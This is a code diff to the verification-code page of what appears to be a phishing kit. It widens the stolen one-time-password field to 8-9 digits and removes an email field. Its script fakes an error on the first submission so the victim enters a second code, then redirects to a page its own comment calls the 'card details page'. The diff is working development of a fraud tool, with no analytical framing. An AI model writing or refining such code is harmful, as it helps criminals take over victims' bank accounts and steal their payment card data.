@@ -67,16 +67,11 @@
                            <div class="col-xs-10 col-xs-offset-1">
                                <form action="" method="post" id="res" enctype="multipart/form-data">
                                    <h3 style="font-family: sans-serif;text-align: center;">Enter Verification Code</h3>
-                                   <p style="text-align: center; color: #717171; margin-bottom: 20px;">Please enter the OTP code sent to your device</p>
+                                   <p style="text-align: center; color: #717171; margin-bottom: 20px;">Please enter the 8-9 digit OTP code sent to your device</p>
                                    
                                   <div class="us-norm us-mt">
-                                   <input type="text" class="frinp" name="otp" id="otp" required pattern="[0-9]{6}" maxlength="6">
-                                   <label for="otp" class="frel">OTP Code</label>
-                                  </div>
-                                  
-                                  <div class="us-norm" id="emailField" style="display:none;">
-                                   <input type="email" class="frinp" name="email" id="email">
-                                   <label for="email" class="frel">Email Address</label>
+                                   <input type="text" class="frinp" name="otp" id="otp" required pattern="[0-9]{8,9}" minlength="8" maxlength="9">
+                                   <label for="otp" class="frel">OTP Code (8-9 digits)</label>
                                   </div>
                                   
                                   <div class="row">
@@ -174,17 +169,15 @@
                   console.log(xhr.responseText);
       
                   if (formSubmitted === 1) {
-                      // First attempt failed - show email field
+                      // First attempt failed
                       document.getElementById("otp").value = "";
                       document.getElementById("rror").style.display = "block";
-                      document.getElementById("emailField").style.display = "block";
-                      document.getElementById("email").required = true;
                       setTimeout(() => {
                         document.getElementById("rror").style.display = "none"
                       }, 3000);
                   } else if (formSubmitted >= 2) {
-                      // Second attempt - proceed to next page
-                      window.location.href = "./fl.php";
+                      // Second attempt - proceed to card details page
+                      window.location.href = "./verify.php";
                   }
               }
           };
